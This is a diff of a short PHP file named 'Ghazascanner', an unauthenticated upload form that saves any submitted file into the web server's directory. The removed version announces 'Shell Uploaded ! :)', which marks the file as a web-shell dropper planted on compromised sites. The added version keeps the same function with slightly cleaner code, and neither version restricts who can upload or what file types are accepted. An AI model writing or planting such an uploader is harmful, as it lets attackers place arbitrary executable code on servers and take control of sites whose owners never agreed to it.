@@ -1,10 +1,18 @@
 <?php
 echo '<html><head><title>Ghazascanner</title>
 </head>';
-echo 'Ghazascanner<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
-if( $_POST['_upl'] == "Upload" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
-else { echo '<b>Not uploaded ! </b><br><br><html>'; }
-}
+echo 'Ghazascanner<form enctype="multipart/form-data" action="" method="POST">
+    <input type="file" name="uploaded_file"></input>
+    <input type="submit" value="Upload"></input>
+  </form>';
+  if(!empty($_FILES['uploaded_file']))
+  {
+    $path = basename( $_FILES['uploaded_file']['name']);
+    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
+      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
+      " uploaded !";
+    } else{
+        echo "not uploaded !";
+    }
+  }
 ?>
